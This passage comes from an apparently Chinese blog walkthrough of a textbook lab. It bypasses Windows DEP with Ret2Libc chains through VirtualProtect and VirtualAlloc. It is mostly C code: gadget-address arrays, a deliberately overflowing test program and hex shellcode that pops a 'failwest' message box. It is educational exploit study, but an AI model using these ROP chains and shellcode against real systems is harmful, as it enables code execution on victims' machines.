EBP+8 的位置，如果此时我们能找到类似 MOV [EBP],** POP ** POP ** POP ** RETN 或者 MOV [EBP],** JMP **的指令就可以将要修改属性的内存地址设置为当前堆栈中的某个地址了。但是我们并没有找到这样的指令，我们不妨让 ESP 向下移动 4 个字节，然后执行一条 PUSH ESP RETN/JMP EAX 指令也能达到目的。那么什么样的指令能让 ESP 向高址方向移动 4字节，而不影响程序的控制？RETN指令，既能让 esp+4 又能收回程序控制权</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x53\xe3\xec\x77&quot;</span> <span class="comment">//修正 EBP 77ECE353</span></span><br><span class="line"> <span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>运行调试。在 0x7CBBD9BA（调整EBP 入口）处下断点。运行到 JMP EAX 时暂停程序，观察当前内存状态。如下图所示，已经成功将 EBP+0x8 写为当前堆栈中的地址。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626101743336-165629394983520.png" alt="image-20220626101743336"></p><ol start="2"><li>保证 EBP+0x14 处存放的地址为可写地址</li></ol><p>让 ESP 指向 EBP+0x18，再用 PUSH ESP JMP EAX 指令来设置 EBP+0x14 的参数。</p><p>（1）观察堆栈，此时 ESP=0x0012FE70，EBP+0x14=0x0012FE7C，只需让 ESP 向高址方向移动 16 个字节，就能让 ESP 指向 EBP+0x18（=0x0012FE80）。使用类似 POP POP POP RETN指令（注意：不能修改 ESP、EBP、EAX）选用 0x7CBF1A0A 处的 POP ESI POP EBX POP EDI RETN 指令。</p><p>（2）用 PUSH ESP JMP EAX 指令设置 EBP+0x14 的参数。先要重新获得程序控制权，当前正在执行 jmp eax，所以要先使用 POP EAX RETN 指令地址覆盖 test() 返回地址，来将 0x7CBF1A0A 赋值给 EAX，才能执行 POP POP POP RETN指令。</p><p>（3）确定那两个固定参数，shellcode大小 0xff 就足够弹框代码用了，那个常量就用0x40。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626110433976-165629394983521.png" alt="image-20220626110433976"></p><p>总结一下刚才的过程：<br> 1.首先通过pop eax ret将pop pop pop ret的地址保存到eax。<br> 2.修正ebp，由于是retn 4，所以要加4个字节的90填充。<br> 3.执行push esp，jmp eax，此时通过ebp索引的参数值已经可以对上号了，除了那个可写的地址。</p><p>（4）接下来要把 ESP 写入到 EBP+0x14 处。用 push esp jmp eax 来把 EBP+0x14 写为可写入地址。然后在执行完 pop pop pop retn 后返回到 virtualProtect() 来把 Shellcode 设置为可执行页。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"> <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line"><span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span><span class="comment">//修改内存属性</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626105048718-165629394983522.png" alt="image-20220626105048718"></p><p>如下图所示，EAX 的值为 1， 根据 MSDN 的介绍说明我们已经成功修改了内存属性。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626111913356-165629394983523.png" alt="image-20220626111913356"></p><p><strong>（ 3）跳转到 shellcode 执行</strong></p><p>接下来的布置工作很简单，在位置 0X12FE98 放置 JMP ESP 指令，并在 RETN 0x10 后 ESP 指向的位置（0x0012FEAC）开始放置弹出对话框的机器码，实现 exploit。</p><p>按下图布置 shellcode：<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626114457594-165629394983525.png" alt="image-20220626114457594"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"><span class="string">&quot;\x0A\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop pop retn</span></span><br><span class="line"><span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP ,push esp pop ebp retn</span></span><br><span class="line"><span class="string">&quot;\x8B\x17\x84\x7C&quot;</span><span class="comment">//RETN</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//要修改的内存大小</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//可读可写可执行属性代码</span></span><br><span class="line"><span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xE8\x1F\x80\x7C&quot;</span><span class="comment">//修改内存属性</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xA4\xDE\xA2\x7C&quot;</span><span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(str,shellcode,<span class="number">420</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序，弹出 “failwest” 对话框，攻击成功，如下图。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626112209723-165629394983524.png" alt="image-20220626112209723"></p><h3 id="ret2libc-实战之利用-virtualalloc"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-virtualalloc"></a> Ret2Libc 实战之利用 VirtualAlloc</h3><p>除了修改属性外，我们还可以通过 kernel32.dll 中的 VirtualAlloc 函数来申请一段具有可执行属性的内存。  我们就可以将 Ret2Libc 的第一跳设置为 VirtualAlloc 函数地址，然后将shellcode 复制到申请的内存空间里，以绕过 DEP 的限制。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LPVOID WINAPI <span class="title function_">VirtualAlloc</span><span class="params">(</span></span><br><span class="line"><span class="params">    __in_optLPVOID lpAddress,<span class="comment">//申请内存区域的地址，如果这个参数是 NULL，系统将会决定分配内存区域的位置，并且按 64KB 向上取整。</span></span></span><br><span class="line"><span class="params">    __in SIZE_T dwSize,<span class="comment">//申请内存区域的大小。</span></span></span><br><span class="line"><span class="params">    __in DWORD flAllocationType,<span class="comment">//申请内存区域的大小。</span></span></span><br><span class="line"><span class="params">    __in DWORD flProtect<span class="comment">//申请内存的访问控制类型，如读、写、执行等权限。</span></span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//内存申请成功时函数返回申请内存的起始地址，申请失败时返回 NULL。</span></span><br></pre></td></tr></table></figure><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220626115522694-165629394983526.png" alt="image-20220626115522694"></p><p>安照如下参数布置函数，来申请可执行的空间。</p><p>VirtualAlloc(0x0030000, 0xFF, 0x00001000, 0x00000040)</p><p>（ 1） lpAddress=0x00030000，只要选择一个未被占用的地址即可，没有什么特殊要求。<br>（ 2） dwSize=0xFF，申请空间的大小可以根据 shellcode 的长度确定，本次实验申请 255 个字节，足够 shellcode 使用。<br>（ 3） flAllocationType=0x00001000，该值使用 0x00001000 即可， 如有特殊需要可根据 MSDN的介绍来设置为其他值。<br>（ 4） flProtect=0x00000040，内存属性要设置为可读可写可执行，根据 MSDN 介绍，该属性对应的代码为 0x00000040。</p><h4 id="实验代码-3"><a class="markdownIt-Anchor" href="#实验代码-3"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn 4</span></span><br><span class="line">    <span class="string">&quot;\xBC\x45\x82\x7C&quot;</span><span class="comment">//申请空间</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\xFF\xFF\xFF&quot;</span><span class="comment">//-1 当前进程</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//申请空间起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//申请空间大小</span></span><br><span class="line">    <span class="string">&quot;\x00\x10\x00\x00&quot;</span><span class="comment">//申请类型</span></span><br><span class="line">    <span class="string">&quot;\x40\x00\x00\x00&quot;</span><span class="comment">//申请空间访问类型</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8A\x17\x84\x7C&quot;</span><span class="comment">//pop eax retn</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x0B\x1A\xBF\x7C&quot;</span><span class="comment">//pop pop retn</span></span><br><span class="line">    <span class="string">&quot;\xBA\xD9\xBB\x7C&quot;</span><span class="comment">//修正 EBP retn4</span></span><br><span class="line">    <span class="string">&quot;\x5F\x78\xA6\x7C&quot;</span><span class="comment">//pop retn</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，转入执行用</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//可执行内存空间地址，复制用</span></span><br><span class="line">    <span class="string">&quot;\xBF\x7D\xC9\x77&quot;</span><span class="comment">//push esp jmp eax &amp;&amp; 原始 shellcode 起始地址</span></span><br><span class="line">    <span class="string">&quot;\xFF\x00\x00\x00&quot;</span><span class="comment">//shellcode 长度</span></span><br><span class="line">    <span class="string">&quot;\xAC\xAF\x94\x7C&quot;</span><span class="comment">//memcpy</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x00\x03\x00&quot;</span><span class="comment">//一个可以读地址</span></span><br><span class="line">    <span class="string">&quot;\x00\x90\x90\x94&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;……&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    chartt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(tt,shellcode,<span class="number">450</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCEhInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    chartemp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路-3"><a class="markdownIt-Anchor" href="#实验思路-3"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，我们在本次实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 中通过向 str 复制超长字符串造成 str 溢出，进而覆盖函<br>数返回地址。<br>（ 3）覆盖掉函数返回地址后，通过 Ret2Libc 